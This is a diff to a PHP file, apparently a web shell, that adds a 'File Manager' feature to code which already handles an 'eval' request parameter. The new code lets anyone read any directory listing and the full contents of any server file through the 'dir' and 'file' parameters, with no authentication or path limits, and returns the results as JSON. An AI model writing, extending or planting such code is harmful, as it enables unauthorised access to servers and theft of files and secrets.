@@ -292,3 +292,83 @@ if (isset($_REQUEST['eval'])) {
         'took' => round($t2 - $t1, 2),
     ));
 }
+
+/**
+ * File Manager
+ */
+function list_folder_files($dir)
+{
+    $files = scandir($dir);
+    $data = array();
+    foreach ($files as $file) {
+        $fpath = $dir . DIRECTORY_SEPARATOR . $file;
+        $mtime = filemtime($fpath);
+        array_push($data, array(
+            'filename' => $file,
+            'type' => is_dir($fpath) ? 'folder' : 'file',
+            'fullpath' => realpath($fpath),
+            'size' => is_dir($fpath) ? 0 : filesize($fpath),
+            'permissions' => file_permissions($fpath),
+            'modifiedAt' => ($mtime ? @date('c', $mtime) : '')
+        ));
+    }
+    return $data;
+}
+function file_permissions($filename)
+{
+    $p = fileperms($filename);
+    if (($p & 0xC000) == 0xC000) { // Socket
+        $i = 's';
+    } elseif (($p & 0xA000) == 0xA000) { // Enlace Simbólico
+        $i = 'l';
+    } elseif (($p & 0x8000) == 0x8000) { // Regular
+        $i = '-';
+    } elseif (($p & 0x6000) == 0x6000) { // Especial Bloque
+        $i = 'b';
+    } elseif (($p & 0x4000) == 0x4000) { // Directorio
+        $i = 'd';
+    } elseif (($p & 0x2000) == 0x2000) { // Especial Carácter
+        $i = 'c';
+    } elseif (($p & 0x1000) == 0x1000) { // Tubería FIFO
+        $i = 'p';
+    } else { // Desconocido
+        $i = 'u';
+    }
+    // Propietario
+    $i .= (($p & 0x0100) ? 'r' : '-');
+    $i .= (($p & 0x0080) ? 'w' : '-');
+    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
+    // Grupo
+    $i .= (($p & 0x0020) ? 'r' : '-');
+    $i .= (($p & 0x0010) ? 'w' : '-');
+    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
+    // Otros
+    $i .= (($p & 0x0004) ? 'r' : '-');
+    $i .= (($p & 0x0002) ? 'w' : '-');
+    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
+    return $i;
+}
+
+if (isset($_REQUEST['dir'])) {
+    $t1 = microtime(true);
+    $directory = realpath(trim($_REQUEST['dir']));
+    $output = list_folder_files($directory);
+    $t2 = microtime(true);
+    output_json(array(
+        'path' => $directory,
+        'isWritable' => @is_writable(realpath($directory)),
+        'files' => $output,
+        'took' => round($t2 - $t1, 2),
+    ));
+}
+if (isset($_REQUEST['file'])) {
+    $t1 = microtime(true);
+    $filepath = realpath(trim($_REQUEST['file']));
+    $output = file_get_contents($filepath);
+    $t2 = microtime(true);
+    output_json(array(
+        'path' => $filepath,
+        'content' => $output,
+        'took' => round($t2 - $t1, 2),
+    ));
+}
